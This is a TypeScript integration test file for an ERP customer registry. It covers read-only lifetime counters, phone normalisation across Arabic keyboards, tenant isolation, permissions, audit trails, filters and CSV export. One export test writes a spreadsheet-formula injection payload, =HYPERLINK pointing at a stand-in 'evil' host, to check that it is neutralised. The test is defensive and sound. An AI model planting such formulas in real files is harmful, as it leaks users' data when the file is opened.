import { describe, before, after } from 'node:test';
import assert from 'node:assert/strict';

import { SESSION_COOKIE } from '@landingos/auth';

import {
  skip, BASE, uid, phone, makeErpTenant, makeMember, cleanup,
  contractTest as test,
} from './helpers.ts';

/* =============================================================================
 * test/erp/registry.test.ts — LP.10, restoring R5.
 *
 * The permanent customer registry, which until this slice could be READ as a
 * list and nothing else: no detail route, no detail screen, no correction, no
 * export, and eight of the legacy's twelve filters missing. Meanwhile the schema
 * carried five `imported*` columns and an `address` for features that did not
 * exist — a standing invitation to assume they work.
 *
 * The two properties this file exists to defend, both of which are easy to
 * "improve" into something wrong:
 *
 *   1. THE LIFETIME COUNTERS ARE NEVER HAND-EDITABLE. They move only through
 *      order events, and the registry's whole value is the claim that every one
 *      of them is the sum of things that actually happened.
 *   2. THE IMPORTED FIGURES ARE NOT THE OBSERVED ONES. A number carried in from
 *      a spreadsheet is a record of what the spreadsheet said.
 * ========================================================================== */

let acme: Awaited<ReturnType<typeof makeErpTenant>>;
let clientId = '';
let clientPhone = '';

const page = (path: string, token?: string) =>
  fetch(BASE + path, {
    redirect: 'manual',
    headers: token ? { cookie: `${SESSION_COOKIE}=${token}` } : {},
  });

const html = async (path: string, token?: string) => {
  const res = await page(path, token);
  return { status: res.status, body: await res.text() };
};

before(async () => {
  if (skip) return;
  acme = await makeErpTenant('registry');

  clientPhone = phone();
  // Two orders for one customer, so the history has something to show and the
  // counters have something to be the sum of.
  for (const product of ['Registry Widget', 'Registry Gadget']) {
    await acme.manager.api('POST', '/api/erp/orders', {
      client: 'Registry Customer', phone: clientPhone, price: 3200, product,
      wilaya: 'Alger', commune: 'Bab Ezzouar',
    });
  }

  const list = await acme.manager.api('GET', `/api/erp/clients?search=${clientPhone}`);
  clientId = list.body.data.items[0].id;
  assert.ok(clientId, 'the registry did not pick up an order');
});

after(async () => {
  if (skip) return;
  await cleanup();
});

describe('a customer record can be opened', () => {
  test('the detail carries the counters and the complete order history', async () => {
    const r = await acme.manager.api('GET', `/api/erp/clients/${clientId}`);
    assert.equal(r.status, 200);
    assert.equal(r.body.data.totalOrders, 2);
    assert.equal(r.body.data.history.length, 2, 'both orders must be on the record');
    assert.ok(r.body.data.history[0].reference, 'the history carries the number a customer reads back');
  });

  test('the history is joined by NORMALISED phone, like the counters', async () => {
    // The counters and the history must describe the same set of orders. They
    // do because both go through `normalizePhone` — an order typed with spaces
    // or a +213 prefix belongs to the same customer.
    const spaced = clientPhone.replace(/^(\d{4})(\d+)$/, '$1 $2');
    await acme.manager.api('POST', '/api/erp/orders', {
      client: 'Registry Customer', phone: spaced, price: 100, product: 'Spaced',
    });
    const r = await acme.manager.api('GET', `/api/erp/clients/${clientId}`);
    assert.equal(r.body.data.totalOrders, 3);
    assert.equal(r.body.data.history.length, 3, 'a differently-typed number is the same customer');
  });

  test('a number typed on an ARABIC keyboard is the same customer too', async () => {
    // The audience this platform sells to types on Arabic keyboards, and
    // `normalizePhone` only ever stripped `\s` — which is ASCII-blind. One
    // customer ordering three times from three keyboards became THREE registry
    // rows with their lifetime history split in thirds, silently: no error, no
    // log line, and only noticeable when somebody asks why a repeat customer
    // shows as new. That is the exact failure this module's own header opens by
    // describing, arriving through a door it did not check.
    //
    // Its own customer, deliberately: the shared fixture's counters are what
    // the neighbouring tests assert on, and a test that moves them is a test
    // that breaks its neighbours.
    const own = phone();
    const arabicIndic = own.replace(/[0-9]/g, (d) => String.fromCodePoint(0x0660 + Number(d)));
    assert.notEqual(arabicIndic, own, 'the second spelling really is a different script');

    for (const [typed, product] of [
      [own, 'ASCII keypad'],
      [arabicIndic, 'Arabic keypad'],
      // The invisible mark a paste out of RTL text carries. Not whitespace, so
      // the `\s` strip never removed it and the key gained a character.
      [`‏${own}`, 'RTL paste'],
    ] as const) {
      const r = await acme.manager.api('POST', '/api/erp/orders', {
        client: 'Arabic Keyboard Customer', phone: typed, price: 100, product,
      });
      assert.equal(r.status, 201, `the ${product} order must be accepted`);
    }

    const list = await acme.manager.api('GET', `/api/erp/clients?search=${own}`);
    assert.equal(list.body.data.items.length, 1, 'one customer, one registry row');
    assert.equal(list.body.data.items[0].totalOrders, 3, 'all three orders on the one record');
  });

  test('another tenant’s customer is a 404, not a 403', async () => {
    // Confirming a row exists elsewhere is itself information.
    const beta = await makeErpTenant(`reg-beta-${uid()}`);
    const betaPhone = phone();
    await beta.manager.api('POST', '/api/erp/orders', {
      client: 'Beta Customer', phone: betaPhone, price: 500,
    });
    const theirs = (await beta.manager.api('GET', `/api/erp/clients?search=${betaPhone}`))
      .body.data.items[0].id;

    assert.equal((await acme.manager.api('GET', `/api/erp/clients/${theirs}`)).status, 404);
    assert.equal((await beta.manager.api('GET', `/api/erp/clients/${theirs}`)).status, 200);
  });

  test('an agent cannot read the registry at all — erp:clients:read is SENSITIVE', async () => {
    // 403, not 404: an API route refuses a permission the caller lacks. The
    // 404 rule is for another TENANT's resource, where confirming existence is
    // itself information. The SCREEN answers 404, because a page that does not
    // exist for you is the honest console answer — and both are asserted.
    assert.equal((await acme.agent.api('GET', `/api/erp/clients/${clientId}`)).status, 403);
  });
});

describe('a customer record can be corrected, and only where it should be', () => {
  test('the four fields with no automatic source are writable', async () => {
    const r = await acme.manager.api('PATCH', `/api/erp/clients/${clientId}`, {
      name: 'Corrected Name',
      wilaya: 'Oran',
      commune: 'Bir El Djir',
      address: '12 rue des Frères',
    });
    assert.equal(r.status, 200, JSON.stringify(r.body));
    assert.equal(r.body.data.name, 'Corrected Name');
    assert.equal(r.body.data.address, '12 rue des Frères');
  });

  test('a lifetime counter is REFUSED BY NAME, never silently dropped', async () => {
    // D-LP.1's rule. A caller sending `totalSpent` believes they are setting a
    // customer's lifetime spend; a 200 that does nothing is the same class of
    // defect LP.1 existed to fix in `costPrice`.
    for (const field of ['totalOrders', 'deliveredOrders', 'totalSpent', 'importedTotalSpent']) {
      const r = await acme.manager.api('PATCH', `/api/erp/clients/${clientId}`, {
        [field]: 99999,
      });
      assert.equal(r.status, 422, `${field} was accepted`);
      assert.equal(r.body.error.code, 'READ_ONLY_FIELD');
    }
    const after = await acme.manager.api('GET', `/api/erp/clients/${clientId}`);
    assert.equal(after.body.data.totalOrders, 3, 'the counters must be untouched');
  });

  test('the phone number is not editable — it is the identity key', async () => {
    // `@@unique([tenantId, phone])`, and every order joins to this record BY
    // VALUE. Editing it would either collide with another customer or silently
    // detach this record from its own history.
    const r = await acme.manager.api('PATCH', `/api/erp/clients/${clientId}`, {
      phone: '0555000000',
    });
    assert.equal(r.status, 422);
    assert.equal(r.body.error.code, 'READ_ONLY_FIELD');
  });

  test('correcting a record leaves an audit row saying WHICH fields', async () => {
    await acme.manager.api('PATCH', `/api/erp/clients/${clientId}`, { commune: 'Es Senia' });
    const audit = await acme.manager.api(
      'GET', `/api/erp/audit?entity=client&entityId=${clientId}`,
    );
    assert.equal(audit.status, 200);
    assert.ok(audit.body.data.items.length > 0, 'a correction wrote no trail');
    // The keys, never the values: this table holds a person's home address.
    const payload = audit.body.data.items[0].payload;
    assert.ok(Array.isArray(payload.fields));
    assert.ok(!JSON.stringify(payload).includes('Es Senia'), 'an audit row must not carry an address');
  });

  test('an empty patch is refused rather than answering 200 for nothing', async () => {
    const r = await acme.manager.api('PATCH', `/api/erp/clients/${clientId}`, {});
    assert.equal(r.status, 422);
  });

  test('a made-up id is a 404', async () => {
    assert.equal(
      (await acme.manager.api('PATCH', '/api/erp/clients/nope', { name: 'x' })).status,
      404,
    );
  });

  test('somebody without erp:clients:write cannot correct a record', async () => {
    // The permission is SENSITIVE (added by LP.10), so a MANAGER does not hold
    // it by role — only OWNER/ADMIN, or a named grant.
    const manager = await makeMember(acme.tenantId, {
      role: 'MANAGER', permissions: ['erp:clients:read'],
    });
    const r = await manager.api('PATCH', `/api/erp/clients/${clientId}`, { name: 'nope' });
    assert.equal(r.status, 403, 'clients:write must not come with clients:read');
  });
});

describe('the registry can be filtered the way the legacy filtered it', () => {
  test('wilaya, minOrders and minDelivered all narrow the list', async () => {
    const staged = await makeErpTenant(`filt-${uid()}`);
    const busy = phone();
    for (let i = 0; i < 3; i += 1) {
      await staged.manager.api('POST', '/api/erp/orders', {
        client: 'Busy', phone: busy, price: 1000, wilaya: 'Alger', product: 'Filter Widget',
      });
    }
    await staged.manager.api('POST', '/api/erp/orders', {
      client: 'Quiet', phone: phone(), price: 1000, wilaya: 'Oran', product: 'Other Widget',
    });

    const all = await staged.manager.api('GET', '/api/erp/clients');
    assert.equal(all.body.data.total, 2);

    const alger = await staged.manager.api('GET', '/api/erp/clients?wilaya=Alger');
    assert.equal(alger.body.data.total, 1);

    const min3 = await staged.manager.api('GET', '/api/erp/clients?minOrders=3');
    assert.equal(min3.body.data.total, 1);

    const min99 = await staged.manager.api('GET', '/api/erp/clients?minOrders=99');
    assert.equal(min99.body.data.total, 0);

    // `product` is a property of the customer's ORDERS — `Client` has no column
    // for it, because a customer buys many products over a lifetime.
    const byProduct = await staged.manager.api('GET', '/api/erp/clients?product=Filter%20Widget');
    assert.equal(byProduct.body.data.total, 1);

    const byMissingProduct = await staged.manager.api('GET', '/api/erp/clients?product=Nothing');
    assert.equal(
      byMissingProduct.body.data.total, 0,
      'a history filter matching no orders must narrow to nothing, not be ignored',
    );
  });

  test('the filter bar offers exactly what clientFilters reads', async () => {
    // Both directions, the rule D-LP.3 established for the order list.
    const r = await html('/console/erp/clients', acme.manager.token);
    assert.equal(r.status, 200);
    for (const name of ['search', 'wilaya', 'product', 'minOrders', 'minDelivered', 'since', 'until']) {
      assert.match(r.body, new RegExp(`id="filter-${name}"`), `${name} must have a control`);
    }
  });
});

describe('the registry leaves the building', () => {
  test('the export is a CSV with the legacy’s column names and a BOM', async () => {
    // A RAW fetch, and asserted on the BYTES. `Response.text()` strips a leading
    // BOM by specification, so the obvious assertion cannot fail — and those
    // three bytes are what Excel decides the whole file encoding from (LP.6).
    const res = await fetch(`${BASE}/api/erp/clients/export`, {
      headers: { cookie: `${SESSION_COOKIE}=${acme.manager.token}` },
    });
    assert.equal(res.status, 200);
    assert.match(res.headers.get('content-type') ?? '', /text\/csv/);
    assert.match(res.headers.get('content-disposition') ?? '', /attachment; filename="Clients_/);

    const bytes = new Uint8Array(await res.arrayBuffer());
    assert.deepEqual([bytes[0], bytes[1], bytes[2]], [0xef, 0xbb, 0xbf], 'no UTF-8 BOM: Excel will mojibake every accent');

    const text = new TextDecoder('utf-8').decode(bytes);
    assert.match(text, /Name,Phone,Wilaya,Commune,Address/);
    assert.match(text, /Imported Orders,Imported Spent,Import Source/, 'an import must be visible in the export');
  });

  test('the export IS the list — it carries the same filters', async () => {
    const staged = await makeErpTenant(`exp-${uid()}`);
    await staged.manager.api('POST', '/api/erp/orders', {
      client: 'Alger Person', phone: phone(), price: 100, wilaya: 'Alger',
    });
    await staged.manager.api('POST', '/api/erp/orders', {
      client: 'Oran Person', phone: phone(), price: 100, wilaya: 'Oran',
    });

    const all = String((await staged.manager.api('GET', '/api/erp/clients/export')).body);
    const alger = String((await staged.manager.api('GET', '/api/erp/clients/export?wilaya=Alger')).body);

    assert.match(all, /Alger Person/);
    assert.match(all, /Oran Person/);
    assert.match(alger, /Alger Person/);
    assert.doesNotMatch(alger, /Oran Person/, 'the export ignored the filter the screen offered');
  });

  test('a formula-leading customer name is neutralised', async () => {
    // A name arrives from a storefront checkout, typed by a stranger, and the
    // file opens in an operator's Excel. `=HYPERLINK(...)` exfiltrates the row
    // it sits next to.
    const staged = await makeErpTenant(`csv-${uid()}`);
    await staged.manager.api('POST', '/api/erp/orders', {
      client: '=HYPERLINK("http://evil","x")', phone: phone(), price: 100,
    });
    // The client name comes from the order's `client` field via the registry.
    const list = await staged.manager.api('GET', '/api/erp/clients');
    await staged.manager.api('PATCH', `/api/erp/clients/${list.body.data.items[0].id}`, {
      name: '=HYPERLINK("http://evil","x")',
    });

    const text = String((await staged.manager.api('GET', '/api/erp/clients/export')).body);
    assert.match(text, /'=HYPERLINK/, 'a formula-leading cell reached Excel unneutralised');
  });

  test('the export is gated on erp:clients:read like the list', async () => {
    assert.equal((await acme.agent.api('GET', '/api/erp/clients/export')).status, 403);
  });
});

describe('the customer record has a screen', () => {
  test('it renders the counters, the history and the correction form', async () => {
    const r = await html(`/console/erp/clients/${clientId}`, acme.manager.token);
    assert.equal(r.status, 200);
    assert.match(r.body, /data-testid="client-stats"/);
    assert.match(r.body, /data-testid="client-history"/);
    assert.match(r.body, /data-testid="client-edit"/);
    assert.match(r.body, /data-testid="client-dial"/, 'this screen is read right before somebody dials');
  });

  test('the list links to it, and the export panel is offered', async () => {
    const r = await html('/console/erp/clients', acme.manager.token);
    assert.match(r.body, new RegExp(`/console/erp/clients/${clientId}`));
    assert.match(r.body, /data-testid="erp-client-export"/);
  });

  test('an agent gets 404 on the detail, as they do on the list', async () => {
    const r = await html(`/console/erp/clients/${clientId}`, acme.agent.token);
    assert.equal(r.status, 404);
  });

  test('the correction form follows the ROUTE’s permission', async () => {
    // D-06.2. `erp:clients:write` is SENSITIVE, so a MANAGER granted only
    // `erp:clients:read` sees the record and no form — and the API agrees.
    const reader = await makeMember(acme.tenantId, {
      role: 'MANAGER', permissions: ['erp:clients:read'],
    });
    const r = await html(`/console/erp/clients/${clientId}`, reader.token);
    assert.equal(r.status, 200, 'they may still read the record');
    assert.ok(!/data-testid="client-edit"/.test(r.body), 'a form the API refuses must not render');
  });
});

describe('the niche filter LP.10 had to leave out (LP.18)', () => {
  test('a niche narrows the registry through the customer’s order history', async () => {
    // R12's business case: "everybody who has ever bought something in the
    // skincare niche" is a repeat-purchase campaign, and until `niche` was a
    // column it was uncomputable — which is why LP.10 shipped without it and
    // said so.
    const staged = await makeErpTenant(`niche-${uid()}`);
    await staged.manager.api('POST', '/api/erp/products', {
      name: 'Serum A', price: 3000, niche: 'skincare',
    });
    await staged.manager.api('POST', '/api/erp/products', {
      name: 'Shampoo B', price: 1500, niche: 'haircare',
    });
    await staged.manager.api('POST', '/api/erp/orders', {
      client: 'Skin Buyer', phone: phone(), price: 3000, product: 'Serum A',
    });
    await staged.manager.api('POST', '/api/erp/orders', {
      client: 'Hair Buyer', phone: phone(), price: 1500, product: 'Shampoo B',
    });

    const all = await staged.manager.api('GET', '/api/erp/clients');
    assert.equal(all.body.data.total, 2);

    const skincare = await staged.manager.api('GET', '/api/erp/clients?niche=skincare');
    assert.equal(skincare.body.data.total, 1);
    assert.equal(skincare.body.data.items[0].name, 'Skin Buyer');

    // A niche no product carries narrows to NOTHING rather than being ignored.
    const nobody = await staged.manager.api('GET', '/api/erp/clients?niche=nonexistent');
    assert.equal(nobody.body.data.total, 0);
  });

  test('the control is offered once the catalogue uses a niche', async () => {
    const staged = await makeErpTenant(`nichectl-${uid()}`);
    const before = await html('/console/erp/clients', staged.manager.token);
    assert.ok(!/id="filter-niche"/.test(before.body), 'no niches, no control');

    await staged.manager.api('POST', '/api/erp/products', {
      name: 'Niched', price: 100, niche: 'skincare',
    });
    const after = await html('/console/erp/clients', staged.manager.token);
    assert.match(after.body, /id="filter-niche"/);
  });
});
